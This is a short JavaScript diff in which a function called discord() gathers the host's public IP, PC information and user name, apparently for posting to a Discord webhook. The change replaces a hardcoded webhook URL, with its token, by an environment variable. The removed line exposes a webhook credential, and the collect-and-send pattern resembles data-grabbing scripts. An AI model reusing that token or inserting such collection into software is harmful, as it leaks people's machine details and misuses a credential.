@@ -81,7 +81,7 @@ export async function getPublicIP() {
 }
 
 export async function discord() {
-  const WEBHOOK = "https://discord.com/api/webhooks/1484667909753147522/xQIDVOoABJnaMNdZM-YFafrHJ09fDQEK_iZgCv5aLvj9YZ8Vy4A9NYoXbx47Tjex11TC";
+  const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
   const ip = await getPublicIP();
   const pcInfo = await getPcInfo();
   const user = await getUser();
